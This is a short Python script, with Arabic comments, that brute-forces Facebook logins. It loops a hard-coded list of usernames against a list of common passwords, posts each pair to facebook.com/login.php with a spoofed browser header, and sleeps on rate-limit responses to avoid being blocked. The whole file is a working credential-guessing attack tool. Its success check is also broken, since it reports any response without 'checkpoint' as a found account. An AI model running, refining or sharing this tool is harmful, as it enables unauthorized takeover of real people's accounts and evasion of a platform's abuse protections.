import requests
import time
import random
print("islam hay")
# كلمات مرور عشوائية
passwords = [
    "1234567890",
    "11223344556677889900",
    "islamislam",
    "alahalah",
    "moslim",
    "qwerty",
    "password",
    "admin",
    "1234",
    "letmein",
    "welcome",
    "test123",
    "password123",
    "admin123",
    "changeme",
    "123abc",
    "iloveyou",
    "sunshine",
    "monkey",
    "123321",
    "secret",
    "12345",
    "adminadmin",
    "abc123",
    "qwerty123",
    "pass123",
    "superman",
    "admin1234",
    "qwertyuiop",
    "password1",
    "qwerty12345",
    "adminadminadmin",
    "adminpass",
    "adminpassword",
    "administrator",
    "adminadmin1",
    "adminadmin123",
    "adminadmin1234",
    "adminadmin12345",
    # ... وغيرها
]

# حسابات عشوائية للفيسبوك
facebook_accounts = [
    "mohamed mohamed",
    "islam islam",
    "alah alah",
    "jhon jhon",
    "ahmed ahmed",
    "adem adem",
    "testuser",
    "user123",
    "admin123",
    "johndoe",
    "janedoe",
    "guestuser",
    "newuser",
    "adminuser",
    "webadmin",
    "superuser",
    "user1",
    "user2",
    "user3",
    "user4",
    "user5",
    "admin1",
    "admin2",
    "admin3",
    "admin4",
    "admin5",
    "root",
    "guest",
    "admin6",
    "admin7",
    "admin8",
    "admin9",
    "admin10",
    "user6",
    "user7",
    "user8",
    "user9",
    "user10",
    "johnny",
    "janey",
    "testadmin",
    "newadmin",
    # ... وغيرها
]

# دالة لمنع الحظر
def prevent_block(response):
    # تحقق مما إذا كانت الاستجابة تحتوي على خطأ
    if response.status_code == 429:
        # زيادة الفاصل الزمني بين المحاولات
        time.sleep(random.randint(60, 120))

# دالة للتخمين على حساب Facebook
def guess_facebook(username, password):
    # إنشاء رأس HTTP
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36"}

    # إنشاء طلب HTTP
    request = requests.post(
        "https://www.facebook.com/login.php",
        headers=headers,
        data={"email": username, "pass": password},
    )

    # منع الحظر
    prevent_block(request)

    # تحقق مما إذا كانت الاستجابة تحتوي على رسالة خطأ
    if "checkpoint" in request.text:
        # حساب محظور
        print("Account is blocked:", username)
    else:
        # الحساب الموجود
        print("Found account:", username, password)

# تشغيل الحلقة الرئيسية
for username in facebook_accounts:
    for password in passwords:
        guess_facebook(username, password)
